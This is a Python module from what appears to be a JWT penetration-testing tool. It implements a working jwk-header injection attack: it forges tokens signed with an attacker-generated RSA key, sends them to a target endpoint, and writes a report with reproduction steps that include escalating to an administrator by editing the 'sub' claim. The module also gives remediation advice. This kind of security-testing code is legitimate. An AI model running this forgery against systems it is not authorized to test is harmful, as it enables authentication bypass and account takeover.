"""Attack 4: JWK injection, embed an attacker public key in the `jwk` header.

The JWS spec lets a token carry its own verification key in a `jwk` header parameter. A server
that trusts that embedded key, instead of only keys from its own trusted store, can be fooled:
we generate our OWN RSA keypair, put the public half in the `jwk` header, and sign the token
with the matching private key. The server reads our public key out of the token and uses it to
verify, so of course it accepts, we controlled both the key and the signature.

We keep the payload unchanged and only swap in our key, so acceptance proves exactly one thing:
the server trusted a key supplied inside the token. (The reproduction steps then show how to turn
that into a privilege escalation by editing a claim.)
"""

import uuid

from jwtpen.core.jwt_utils import decode, encode, construct_jwt, sign_rsa
from jwtpen.core.keys import generate_rsa_keypair, public_key_to_jwk, public_key_pem, private_key_pem
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, resembles, ACCEPTED
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, HIGH


def forge_token(token):
    """Forge a copy of `token` signed by a fresh attacker key, with that key embedded as `jwk`.

    Returns (forged_token, jwk, private_key). We force `alg` to RS256 (our key is RSA) and give
    the key a `kid`, set in both the embedded JWK and the header, since some servers match the
    header's `kid` to the embedded key. The payload is copied through untouched. The private key
    is returned so the report can hand it to the tester to re-sign a hand-edited payload.
    """
    header, payload, _ = decode(token)

    private_key = generate_rsa_keypair()
    kid = str(uuid.uuid4())
    jwk = public_key_to_jwk(private_key.public_key(), kid=kid, alg="RS256")

    header["alg"] = "RS256"
    header["jwk"] = jwk
    header["kid"] = kid

    signing_input = encode(header, payload)
    signature = sign_rsa(signing_input, private_key, "RS256")
    return construct_jwt(signing_input, signature), jwk, private_key


# --- Static content for this attack's report section ---
NAME = "Attacker Key Embedded in Token (jwk Injection)"
DESCRIPTION = "Checks whether the server trusts a public key supplied inside the token's own jwk header."

_SUMMARY = {
    VULNERABLE: ("The server accepted a token signed by an attacker-generated key whose public "
                 "half was embedded in the token's jwk header. Because the server trusts a key "
                 "supplied inside the token, an attacker can sign any token and forge authentication."),
    NOT_VULNERABLE: ("The server rejected a token whose signature relied on a public key embedded "
                     "in its jwk header, which indicates self-supplied keys are not trusted."),
    INCONCLUSIVE: ("The result could not be judged automatically: the endpoint responded the same "
                   "way with and without a valid token, so accepted and rejected tokens could not "
                   "be told apart."),
}

_REPRODUCTION = [
    "Log in and capture your session JWT from the request.",
    "Generate a fresh RSA keypair (for example with the tool's key helper or openssl).",
    'Rebuild the token: keep the payload, set the header "alg" to "RS256", and add a "jwk" header whose value is your PUBLIC key as a JWK ({"kty":"RSA","n":...,"e":...}).',
    "Sign this new token with your PRIVATE key and resend the request. If you remain logged in, the server trusts the key you embedded. That is the vulnerability.",
    'To demonstrate impact, edit a claim in the payload, for example change "sub" to an administrator, re-sign with your private key, and resend.',
    "If the server grants that account's access, you have forged a privileged token using your own key. Re-test other authenticated endpoints too, since this can differ per route.",
]

_REMEDIATION = (
    "Never trust a key supplied inside the token. Ignore the jwk (and jku/x5u/x5c) header "
    "parameters, and verify every token only against keys from a server-side trusted store, "
    "using an explicit allow-list of strong algorithms. Prefer a maintained library that does "
    "not honour embedded keys by default."
)

# Shown only when the attack succeeded: how to reuse the artifacts in the evidence by hand.
_MANUAL_FOLLOWUP = [
    "The forged token in the evidence is signed by the attacker keypair shown alongside it. To craft further tokens by hand, paste the forged token into a JWT decoder, edit the payload (for example change \"sub\"), and re-sign using the attacker Private Key (PEM) from the evidence.",
    "The matching public key travels inside the token's own jwk header, so a decoder can confirm the new signature against that embedded key (or the attacker Public Key (PEM) shown in the evidence).",
    "Confirm impact in the application itself, not only in the decoder: resend each hand-edited token to the target and check the privileged action actually succeeds.",
]

_REFERENCES = [
    {"label": "OWASP Top 10: Identification and Authentication Failures",
     "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    {"label": "RFC 7515: JSON Web Signature (JWS), \"jwk\" (JSON Web Key) Header Parameter",
     "url": "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.3"},
    {"label": "RFC 7517: JSON Web Key (JWK)",
     "url": "https://datatracker.ietf.org/doc/html/rfc7517"},
]


def run(raw_request, token, scheme, options=None):
    """Run the jwk-injection check end to end and return a Finding. (No per-check options are used.)

    Baselines are sent once (good = original token, bad = unparseable token). Then one forged
    token, signed by a fresh attacker key embedded as `jwk`, is sent; if the server accepts it,
    it trusted the embedded key.
    """
    parsed = parse_request(raw_request)
    good = send(parsed, scheme)
    bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
    url = scheme + "://" + parsed["headers"]["Host"] + parsed["path"]

    forged_token, jwk, private_key = forge_token(token)

    forged = None
    if resembles(good, bad):
        # The app answers the same whether or not you're authenticated: no verdict is trustworthy.
        status = INCONCLUSIVE
    else:
        response = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
        if classify(good, bad, response) == ACCEPTED:
            forged = response
        status = VULNERABLE if forged is not None else NOT_VULNERABLE

    methodology = [
        "Generated a fresh RSA keypair and embedded its public key in the token's jwk header.",
        'Set the header algorithm to "RS256" and signed the token with the matching private key.',
        "Resent your original request with this forged token.",
    ]
    if forged is not None:
        methodology.append("The server accepted it, so it trusts a public key supplied inside the token.")
    elif status == NOT_VULNERABLE:
        methodology.append("The server rejected it, so a key embedded in the token is not trusted.")
    else:
        methodology.append("The endpoint responded the same way with and without a valid token, so the result could not be judged automatically.")

    evidence = {
        "Target URL": url,
        "Expected Response (Valid Token)": f"HTTP {good.status_code}",
    }
    manual_followup = []
    if forged is not None:
        evidence["Received Response (Forged Token)"] = f"HTTP {forged.status_code}"
        evidence["Embedded JWK (kid)"] = jwk["kid"]
        evidence["Forged Token"] = forged_token
        evidence["Attacker Public Key (PEM)"] = public_key_pem(private_key).decode()
        evidence["Attacker Private Key (PEM)"] = private_key_pem(private_key).decode()
        manual_followup = _MANUAL_FOLLOWUP

    return Finding(
        attack=NAME,
        status=status,
        severity=HIGH,
        summary=_SUMMARY[status],
        methodology=methodology,
        reproduction=_REPRODUCTION,
        manual_followup=manual_followup,
        evidence=evidence,
        remediation=_REMEDIATION,
        references=_REFERENCES,
    )
